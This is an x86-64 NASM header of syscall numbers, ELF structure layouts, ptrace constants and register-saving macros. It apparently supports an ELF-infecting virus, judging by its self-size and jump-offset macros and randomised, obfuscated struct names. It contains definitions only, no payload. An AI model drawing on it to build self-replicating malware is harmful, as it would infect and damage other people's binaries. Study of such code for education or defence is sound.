; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (IDsDM - _start)
%define FINJMP_OFF (bzU1m8e - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - JeUD6_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - X703hy1rZ_size) + x]

%define CODE_LEN (IDsDM - _start)
%define FINJMP_OFF (bzU1m8e - _start)
%define PAGE_SIZE 0x1000

struc JeUD6
.FDT9L resb PAGE_SIZE
.G47ZqV: resb PAGE_SIZE
.rwpA8dhMq resq 1
.iWNXUwokn: resd 1
.mY2fujeRo: resd 1
.mvJ2G0B resq 1
endstruc

struc X703hy1rZ
.qz9giR resq 1
.jS6sH4kx resq 1
.nGwh0I24 resq 1
.J8JLc resb 1
.WVWWfydEhR resq 1
.xjReXh resq 1
.F4vJxi7 resq 1
.rM6Aog resq 1
.ZpiKQ resq 1 
.zsfLTcza resq 1
.qLMmjsLc resq 1
.GkEOkKIOr resb 1
.gyLo4iIdVn resq 1
.p46XxRV resq 1
.pz2xKF resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc w0adOh4j9A
.ibfFXhKwNB: resb 16
.VnEFCZM: resw 1
.xjUQoGk5: resw 1
.P1QvjD: resd 1
.bmF8Q2: resq 1
.WC98s6: resq 1
.GGUrI: resq 1
.CXzQP6s: resd 1
.eA86A: resw 1
.Ony2MivX: resw 1
.sqnXrEEphp: resw 1
.f1vXuuk9h0: resw 1
.GtDX9: resw 1
.dnDAgwFbY4: resw 1
endstruc

struc l8FG12Pyo
.kI8GKGmN: resd 1
.SpCJOKQQ: resd 1
.IjAqzlaXw: resq 1
.Sol8RvYWh: resq 1
.pVIHw: resq 1
.tnsaLRfc: resq 1
.Ei8V6: resq 1
.kPy7P: resq 1
endstruc

struc TzeIKi
.FK0P9epb: resd 1
.GqOyEFYFY: resd 1
.ZmUzn6VYUA: resq 1
.wXBJbu0: resq 1
.xFsWBb: resq 1
.S1ehM: resq 1
.WgbQd48: resd 1
.NahCGx: resd 1
.siUaAhIwSD resq 1
.yzXkatw resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 